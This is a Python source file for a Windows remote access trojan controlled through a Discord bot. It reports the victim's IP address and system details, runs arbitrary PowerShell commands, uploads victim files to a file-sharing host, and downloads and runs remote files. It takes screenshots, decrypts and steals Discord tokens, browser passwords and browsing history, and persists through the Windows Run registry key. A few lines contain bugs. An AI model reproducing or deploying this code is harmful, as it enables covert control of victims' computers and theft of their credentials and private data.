import os, discord, subprocess, requests, re, json, sys, win32crypt, base64, shutil, sqlite3, dhooks, psutil, winreg
from Crypto.Cipher import AES
from PIL import ImageGrab
from datetime import datetime

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

guild_id = ""
token = ""

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "cwd - Get current working directory",
    "cd - Change directory",
    "ls - List directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "shell - Execute shell command",
    "run <file> - Run an file",
    "exit - Exit the session",
    "screenshot - Take a screenshot",
    "tokens - Get all discord tokens",
    "passwords - Extracts all browser passwords",
    "history - Extracts all browser history",
    "startup <name> - Add to startup",
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping":
        embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd"):
        directory = message.content[3:]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        if len(files) > 4093:
            open(f"{TEMP}\\list.txt", "w").write(files)
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\list.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download"):
        file = message.content[9:]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("upload"):
        link = message.content[7:]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell"):
        command = message.content[6:]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        if output > 4093:
            open(f"{TEMP}\\output.txt", "w").write(output)
            embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run"):
        file = message.content[4:]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "exit":
        await message.channel.delete()
        await bot.close()

    if message.content == "screenshot":
        screenshot = ImageGrab.grab(all_screens=True)
        path = os.path.join(TEMP, "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)
            
    if message.content == "cwd":
        embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        await message.reply(embed=embed)
        
    if message.content == "tokens":
        tokens = []
        path = f"{APPDATA}\\discord"
        if not os.path.exists(path):
            return ["Discord not installed"]
        local_state = open(f"{path}\\Local State", "r")
        encrypted_master_key = base64.b64decode(json.loads(local_state.read())["os_crypt"]["encrypted_key"])
        master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
        for file_name in os.listdir(f"{path}\\Local Storage\\leveldb"):
            if file_name[-3:] not in ["log", "ldb"]:
                continue
            for line in [x.strip() for x in open(f'{path}\\Local Storage\\leveldb\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                    encrypted_token = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
                    token = AES.new(master_key, AES.MODE_GCM, encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16].decode()
                    token = token.replace(".", " ")
                    tokens.append(token)
        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
        await message.reply(embed=embed)
                            
    if message.content == "history":
        paths = []
        file = open(f"{TEMP}\\history.txt", "w")
        for file, folder, files in os.walk(APPDATA):
            if "History" in files:
                paths.append(file) 
        for file, folder, files in os.walk(LOCALAPPDATA):
            if "History" in files:
                paths.append(file) 
        for path in paths:
            if "History" not in os.listdir(path):
                return
            r_id = os.urandom(16).hex()
            shutil.copy (f"{path}\\History", f"{TEMP}\\{r_id}.db")
            connection = sqlite3.connect(f"{TEMP}\\{r_id}.db")
            cursor = connection.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            for col in cursor.fetchall():
                url = col[0]
                title = col[1]
                last_visit_time = col[2]
                f.write(f"{url} - {title} - {datetime.fromtimestamp(last_visit_time/1000000-11644473600).strftime('%Y-%m-%d %H:%M:%S')}\n")
            connection.close()
        file.close()
        embed = discord.Embed(title="History", description="```See attachment```", color=0xfafafa)
        file = discord.File(f"{TEMP}\\history.txt")
        await message.reply(embed=embed, file=file)
        
    if message.content == "passwords":
        paths = []
        file = open(f"{TEMP}\\passwords.txt", "w")
        for file, folder, files in os.walk(APPDATA):
            if "Login Data" in files:
                paths.append(file) 
                
        for file, folder, files in os.walk(LOCALAPPDATA):
            if "Login Data" in files:
                paths.append(file)
        for path in paths:
            if "Login Data" not in os.listdir(path):
                return
            r_id = os.urandom(16).hex()
            try:
                local_state = open(f"{path}\\Local State", "r")
            except:
                try: local_state = open(f"{path}\\..\\Local State", "r")
                except: return
            encrypted_master_key = base64.b64decode(json.loads(local_state.read())["os_crypt"]["encrypted_key"])
            master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
            shutil.copy (f"{path}\\Login Data", f"{TEMP}\\{r_id}.db")
            connection = sqlite3.connect(f"{TEMP}\\{r_id}.db")
            cursor = connection.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for col in cursor.fetchall():
                url = col[0]
                username = col[1]
                try:
                    password = AES.new(master_key, AES.MODE_GCM, col[2][3:15]).decrypt(col[2][15:])[:-16].decode()
                except:
                    try:
                        password = win32crypt.CryptUnprotectData(col[2], None, None, None, 0)[1].decode()
                    except:
                        password = "Decryption failed"
                if password == "":
                    password = "Decryption failed"

                file.write(f"{url} - {username} - {password}\n")
            connection.close()
        file.close()
        embed = discord.Embed(title="Passwords", description="```See attachment```", color=0xfafafa)
        file = discord.File(f"{TEMP}\\passwords.txt")
        await message.reply(embed=embed, file=file)
        
    if message.startswith("startup"):
        name = message.content[8:]
        if not name:
            embed = discord.Embed(title="Error", description="```No name provided```", color=0xfafafa)
            await message.reply(embed=embed)
        else:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, os.path.realpath(__file__))
            winreg.CloseKey(registry_key)
            embed = discord.Embed(title="Startup", description=f"```Added to startup as {name}```", color=0xfafafa)
            await message.reply(embed=embed)

bot.run(token)

